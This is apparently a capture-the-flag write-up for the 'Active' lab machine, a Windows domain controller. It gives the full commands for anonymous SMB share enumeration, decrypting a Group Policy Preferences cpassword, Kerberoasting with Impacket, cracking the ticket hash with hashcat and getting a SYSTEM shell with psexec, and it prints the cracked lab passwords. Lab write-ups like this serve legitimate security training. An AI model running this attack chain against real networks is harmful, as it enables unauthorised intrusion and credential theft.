# Active

This is the write-up for the machine called Active.

## Scanning & Enumeration

Let's start with an nmap scan:

```markdown
nmap -T4 -A -p- 10.10.10.100
```

Relevant results of the scan:

```markdown
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-16 08:49:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

These services are found on an **Active Directory Domain Controller (AD DC)**.

## SMB Exploitation 

The SMB port is open on this Windows Active Directory Domain Controller and it allows us to get the SMB shares by using anonymous authentication:

```markdown
smbclient -L //10.10.10.100
```

The following SMB shares are displayed:

```markdown
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Replication     Disk      
SYSVOL          Disk      Logon server share
Users           Disk
```

**SMBmap** can also enumerate the permissions of the shares without any authentication:

```markdown
smbmap -H 10.10.10.100
```

The following SMB share permission are displayed:

```markdown
Disk             Permissions     Comment
----             -----------     -------
ADMIN$           NO ACCESS       Remote Admin
C$               NO ACCESS       Default share
IPC$             NO ACCESS       Remote IPC
NETLOGON         NO ACCESS       Logon server share
Replication      READ ONLY
SYSVOL           NO ACCESS       Logon server share
Users            NO ACCESS
```

We see that the share **Replication** has a read-only access.

Display the contents of the share recursively by typing:

```markdown
smbmap -H 10.10.10.100 -R Replication
```

There is a file called **Groups.xml** in the directory _"\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\"_, which is a **Group Policy file** where the username and encrypted cPassword are stored.

Navigate to Replication and download **Groups.xml** by typing:

```markdown
smbclient //10.10.10.100/Replication

smb: \> get \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

**Groups.xml** contains the following information:

```markdown
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

The username we find is **active.htb\SVC_TGS** (which is a ticket granting service) and the cPassword is encrypted, but we can decrypt it with **gpp-decrypt**:

```markdown
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

The decrypted password is ```GPPstillStandingStrong2k18```.

Read more about GPP and GPP attacks on [rapid7's blog post](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/).

## Privilege Escalation using Kerberoasting

Install [Impacket](https://github.com/SecureAuthCorp/impacket) as we will use scripts from it that will help us gain root access to this machine.

Clone or download it into the directory of your choice and enter ```pip install .``` in that directory to install Impacket onto your machine.

Run ```pip3 install .``` if the aforementioned does not work.

Run the following command on your machine to start a **Kerberoasting attack**:

```markdown
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
```

The ticket hash for the **Administrator** is the output:

```markdown
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445\*$98484(...)
```

Let's crack this with **Hashcat**:

```markdown
hashcat -m 13100 active.hash /usr/share/wordlists/rockyou.txt
```
**Disclaimer : Do not crack hashes on your VM as it will be very slow since VMs use CPUs. Copy the hash and crack it on your host OS machine since it will use GPUs and that will be much faster.**

The hash gets cracked and the password for the **Administrator** is revealed to be ```Ticketmaster1968```.

Run the following command using **psexec.py** to gain a root shell on the machine: 

```markdown
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
```

We are now **NT Authority\SYSTEM** on the machine.
